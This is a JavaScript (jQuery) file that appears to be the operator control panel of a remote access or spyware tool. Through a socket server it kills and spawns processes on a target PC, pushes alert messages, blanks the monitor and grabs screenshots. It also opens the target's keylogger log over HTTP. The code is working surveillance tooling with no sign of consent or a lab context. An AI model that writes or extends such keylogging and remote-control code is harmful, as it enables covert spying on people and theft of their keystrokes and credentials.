
$(document).ready(function() {
    
    $(".killer").on("click", function() { 
        
        lastUserAction = new Date();

        var pid2kill = $(this).attr('data-pid');
        alert("Killing Process " + pid2kill + " on " + pcname);
        var socket = io("http://localhost:1337");
        socket.emit('kill_process', {id: pcid, pid: pid2kill, pcusername: pcname});
        //socket.disconnect();

    });

    $("#spawner").on("keydown", function(event) { 
        
        lastUserAction = new Date();

        if(event.which == 13) {
            var process = $(this).val();
            $(this).val("");
            var socket = io("http://localhost:1337");
            socket.emit('spawn_process', {id: pcid, pid: process, pcusername: pcname});
        }
        

    });
  
    $("#messagesender").on("keydown", function(event) { 
        
        lastUserAction = new Date();

        if(event.which == 13) {
            var msg = $(this).val();
            $(this).val("");
            var socket = io("http://localhost:1337");
            socket.emit('show_alert_to_user', {id: pcid, message: msg, pcusername: pcname});
        }
        

    });

    $("#takescreenshotbutton").on("click", function(event) { 
        var socket = io("http://localhost:1337");
        socket.emit('take_screenshot', {id: pcid, pcusername: pcname});
        $("#takescreenshotbutton").html("Please wait...");
        setTimeout(function() { 
            //$("#screenshot").html("<img src='http://" + pcip + ":8000/screen.png'></img>");
            window.open("http://" + pcip + ":8000/screen.png");
            
        $("#takescreenshotbutton").html("Take a screenshot");
        }, 1000);
    });
  
    
    $("#monitoroffbutton").on("click", function(event) { 
        var socket = io("http://localhost:1337");
        socket.emit('monitor_off', {id: pcid, pcusername: pcname});

    });

    $("#keyloggerviewbutton").on("click", function(event) { 
        window.open("http://" + pcip + ":8000/keyloggerlog.txt");
    });

    



 });